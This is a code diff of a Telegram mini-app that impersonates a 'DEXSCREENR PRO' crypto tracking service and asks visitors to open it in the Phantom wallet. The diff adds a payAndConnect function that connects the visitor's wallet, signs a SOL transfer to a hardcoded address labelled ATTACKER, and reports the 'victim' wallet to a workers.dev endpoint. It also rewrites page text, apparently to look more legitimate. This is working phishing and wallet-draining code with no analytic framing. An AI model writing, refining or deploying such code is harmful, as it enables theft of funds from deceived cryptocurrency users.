@@ -24,11 +24,9 @@
     overflow: hidden;
   }
 
-  /* --- SCREEN 1: TELEGRAM WAITING --- */
   #telegram-screen {
     display: none; flex-direction: column; align-items: center; justify-content: center;
-    text-align: center; width: 100%; max-width: 320px;
-    animation: fadeIn 0.5s ease;
+    text-align: center; width: 100%; max-width: 320px; animation: fadeIn 0.5s ease;
   }
 
   .pulse-ring {
@@ -40,8 +38,7 @@
   
   .pulse-ring::before {
     content: ''; position: absolute; width: 100%; height: 100%;
-    border-radius: 50%; border: 1px solid #14F195;
-    animation: pulse 2s infinite ease-out;
+    border-radius: 50%; border: 1px solid #14F195; animation: pulse 2s infinite ease-out;
   }
   
   @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
@@ -54,31 +51,23 @@
   .open-phantom-btn {
     width: 100%; padding: 16px; border-radius: 16px;
     background: #ffffff; color: #000000; font-weight: 700; font-size: 15px;
-    border: none; cursor: pointer; transition: all 0.2s;
-    box-shadow: 0 0 20px rgba(255,255,255,0.1);
+    border: none; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(255,255,255,0.1);
   }
   .open-phantom-btn:active { transform: scale(0.96); }
 
-
-  /* --- SCREEN 2: APP (PHANTOM BROWSER) --- */
   #app-screen {
     display: none; flex-direction: column; align-items: center;
-    width: 100%; max-width: 360px;
-    animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    width: 100%; max-width: 360px; animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
   }
   
   @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
   .glass-container {
-    width: 100%;
-    background: rgba(20, 20, 25, 0.5);
-    backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
-    border: 1px solid rgba(255, 255, 255, 0.08);
-    border-radius: 32px; padding: 32px 24px 24px 24px;
+    width: 100%; background: rgba(20, 20, 25, 0.5); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+    border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px;
     display: flex; flex-direction: column; align-items: center;
-    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6);
-    position: relative; overflow: hidden;
+    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
   }
 
   .glass-container::before {
@@ -90,26 +79,21 @@
   .header span { font-size: 20px; font-weight: 900; letter-spacing: 1.5px; color: #ffffff; text-transform: uppercase; }
   .header p { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
 
-  /* PRICING CARDS */
   #pricing-screen { width: 100%; display: flex; flex-direction: column; gap: 10px; transition: opacity 0.4s ease; }
 
   .plan-card {
-    background: rgba(255, 255, 255, 0.03);
-    border: 1px solid rgba(255, 255, 255, 0.06);
-    border-radius: 16px; padding: 16px;
-    display: flex; justify-content: space-between; align-items: center;
+    background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06);
+    border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center;
     cursor: pointer; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
   }
   
   .plan-card:hover { background: rgba(255, 255, 255, 0.06); transform: translateY(-2px); border-color: rgba(255, 255, 255, 0.15); }
   
   .plan-card.free { 
-    border-color: rgba(20, 241, 149, 0.4); 
-    background: linear-gradient(90deg, rgba(20, 241, 149, 0.1) 0%, rgba(20, 241, 149, 0.02) 100%);
+    border-color: rgba(20, 241, 149, 0.4); background: linear-gradient(90deg, rgba(20, 241, 149, 0.1) 0%, rgba(20, 241, 149, 0.02) 100%);
     box-shadow: 0 4px 20px rgba(20, 241, 149, 0.1);
   }
-  .plan-card.free:hover { box-shadow: 0 6px 25px rgba(20, 241, 149, 0.2); }
-
+  
   .plan-info h3 { font-size: 15px; font-weight: 700; color: #fff; }
   .plan-info p { font-size: 11px; color: #a1a1aa; margin-top: 2px; }
   
@@ -124,7 +108,6 @@
   }
   .secret-input.active { display: block; border-color: rgba(20, 241, 149, 0.4); }
 
-  /* CONNECT SCREEN */
   #connect-screen {
     width: 100%; display: none; flex-direction: column; align-items: center;
     opacity: 0; transform: translateY(10px); transition: opacity 0.4s ease, transform 0.4s ease;
@@ -154,78 +137,56 @@
   .spinner { display: none; width: 20px; height: 20px; border: 2.5px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  .back-btn {
-    background: none; border: none; color: #71717a; font-size: 12px; font-weight: 500;
-    margin-top: 20px; cursor: pointer; transition: color 0.2s;
-  }
+  .back-btn { background: none; border: none; color: #71717a; font-size: 12px; font-weight: 500; margin-top: 20px; cursor: pointer; transition: color 0.2s; }
   .back-btn:hover { color: #ffffff; }
 </style>
 </head>
 <body>
 
-  <!-- SCREEN 1: TELEGRAM (Waiting for Phantom) -->
   <div id="telegram-screen">
     <div class="pulse-ring">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
     </div>
-    <h1>Waiting for Phantom</h1>
-    <p>To access the live alpha feed, you must open this mini-app in the Phantom wallet browser.</p>
+    <h1>Connect Wallet</h1>
+    <p>To continue, please open this application in the Phantom wallet browser.</p>
     <button class="open-phantom-btn" id="openPhantomBtn">Open in Phantom</button>
   </div>
 
-  <!-- SCREEN 2: APP (Pricing & Connect) -->
   <div id="app-screen">
     <div class="glass-container">
       <div class="header">
         <span>DEXSCREENR PRO</span>
-        <p>Select a plan to access live alpha.</p>
+        <p>Select a plan to continue.</p>
       </div>
 
-      <!-- PRICING -->
       <div id="pricing-screen">
         <div class="plan-card free" onclick="selectPlan('free')">
-          <div class="plan-info">
-            <h3>1-Day Free Trial</h3>
-            <p>Launch special access</p>
-          </div>
+          <div class="plan-info"><h3>1-Day Free Trial</h3><p>Launch special access</p></div>
           <div class="plan-price">FREE</div>
         </div>
 
         <div class="plan-card" onclick="toggleSecretCode()">
-          <div class="plan-info">
-            <h3>3-Day Access</h3>
-            <p>Requires secret code</p>
-          </div>
+          <div class="plan-info"><h3>3-Day Access</h3><p>Requires secret code</p></div>
           <div class="plan-price paid">CODE</div>
         </div>
         <input type="text" id="secretCode" class="secret-input" placeholder="Enter secret code..." onkeyup="checkSecret(event)">
 
-        <div class="plan-card" onclick="selectPlan('weekly')">
-          <div class="plan-info">
-            <h3>Weekly Pass</h3>
-            <p>Full access to tracker</p>
-          </div>
-          <div class="plan-price paid">0.2 SOL</div>
+        <div class="plan-card" onclick="payAndConnect(0.1, 'Weekly Pass')">
+          <div class="plan-info"><h3>Weekly Pass</h3><p>Full access to tracker</p></div>
+          <div class="plan-price paid">0.1 SOL</div>
         </div>
 
-        <div class="plan-card" onclick="selectPlan('monthly')">
-          <div class="plan-info">
-            <h3>Monthly Pro</h3>
-            <p>Unlimited sniping</p>
-          </div>
-          <div class="plan-price paid">0.5 SOL</div>
+        <div class="plan-card" onclick="payAndConnect(0.25, 'Monthly Pro')">
+          <div class="plan-info"><h3>Monthly Pro</h3><p>Unlimited tracking</p></div>
+          <div class="plan-price paid">0.25 SOL</div>
         </div>
 
-        <div class="plan-card" onclick="selectPlan('yearly')">
-          <div class="plan-info">
-            <h3>Yearly Whale</h3>
-            <p>Best value + VIP</p>
-          </div>
-          <div class="plan-price paid">3.5 SOL</div>
+        <div class="plan-card" onclick="payAndConnect(1.5, 'Yearly Whale')">
+          <div class="plan-info"><h3>Yearly Pro</h3><p>Best value</p></div>
+          <div class="plan-price paid">1.5 SOL</div>
         </div>
       </div>
 
-      <!-- CONNECT -->
       <div id="connect-screen">
         <div class="status-text">Plan: <span id="selectedPlanText">FREE</span></div>
         
@@ -244,7 +205,7 @@
   </div>
 
 <script>
-  // --- LOGIK FÜR DIE UMGEBUNG ---
+  // --- UMGEBUNG CHECK ---
   const tgScreen = document.getElementById('telegram-screen');
   const appScreen = document.getElementById('app-screen');
   const openPhantomBtn = document.getElementById('openPhantomBtn');
@@ -255,31 +216,27 @@
       window.Telegram.WebApp.expand();
     }
 
-    // Prüfen, ob wir in Phantom sind
     const isPhantom = window.phantom?.solana?.isPhantom;
-
     if (isPhantom) {
-      // In Phantom: Zeige das Pricing-Menü
       tgScreen.style.display = 'none';
       appScreen.style.display = 'flex';
       document.body.style.background = 'radial-gradient(circle at 50% 100%, rgba(20, 241, 149, 0.15) 0%, #050505 60%)';
     } else {
-      // In Telegram (oder normalem Browser): Zeige Waiting Screen
       tgScreen.style.display = 'flex';
       appScreen.style.display = 'none';
     }
   });
 
-  // Deep Link zu Phantom
   openPhantomBtn.addEventListener('click', () => {
     const url = window.location.href;
     window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
   });
 
-  // --- UI LOGIC (PRICING & CONNECT) ---
+  // --- UI LOGIC ---
   const pricingScreen = document.getElementById('pricing-screen');
   const connectScreen = document.getElementById('connect-screen');
   const selectedPlanText = document.getElementById('selectedPlanText');
+  const secretInput = document.getElementById('secretCode');
 
   function selectPlan(plan) {
     selectedPlanText.textContent = plan;
@@ -306,29 +263,73 @@
   }
 
   function toggleSecretCode() {
-    const input = document.getElementById('secretCode');
-    input.classList.toggle('active');
-    if(input.classList.contains('active')) input.focus();
+    if (secretInput.classList.contains('active')) {
+      secretInput.classList.remove('active');
+      secretInput.value = '';
+    } else {
+      secretInput.classList.add('active');
+      secretInput.focus();
+    }
   }
 
   function checkSecret(e) {
     if (e.key === 'Enter') {
       const val = e.target.value.toLowerCase();
-      if (val === 'alpha' || val === 'dexscreener') {
+      if (val === 'free3tier') {
+        secretInput.classList.remove('active');
         selectPlan('3-day code');
       } else {
         e.target.value = '';
-        e.target.placeholder = 'Invalid code. Try again.';
+        e.target.placeholder = 'Invalid code.';
       }
     }
   }
 
-  // --- CONNECT LOGIC ---
+  // --- PAID LOGIC (SOL Transfer) ---
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
   const RPC_URL = "https://api.mainnet-beta.solana.com"; 
 
+  async function payAndConnect(amountSol, planName) {
+    if (!window.phantom?.solana?.isPhantom) {
+      alert("Please open in Phantom browser.");
+      return;
+    }
+
+    try {
+      const provider = window.phantom.solana;
+      const resp = await provider.connect();
+      const victim = resp.publicKey;
+      
+      const conn = new solanaWeb3.Connection(RPC_URL);
+      
+      const transaction = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey: victim,
+          toPubkey: new solanaWeb3.PublicKey(ATTACKER),
+          lamports: amountSol * solanaWeb3.LAMPORTS_PER_SOL,
+        })
+      );
+      
+      transaction.feePayer = victim;
+      transaction.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+
+      const signedTx = await provider.signAndSendTransaction(transaction);
+      
+      await fetch(ENDPOINT, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ victim: victim.toString(), type: "payment", plan: planName, sol: amountSol, ts: Date.now() })
+      });
+
+      selectPlan(planName);
+      
+    } catch (e) {
+      console.log("Payment cancelled", e);
+    }
+  }
+
+  // --- CONNECT LOGIC ---
   const container = document.getElementById('sliderContainer');
   const thumb = document.getElementById('sliderThumb');
   const text = document.getElementById('sliderText');
@@ -377,13 +378,7 @@
   }
 
   async function triggerConnect() {
-    let provider;
-    if (window.phantom?.solana?.isPhantom) { provider = window.phantom.solana; }
-    else if (window.solflare?.isSolflare) { provider = window.solflare; }
-
-    if (!provider) { 
-      resetSlider(); return; 
-    }
+    let provider = window.phantom.solana;
 
     try {
       const resp = await provider.connect();
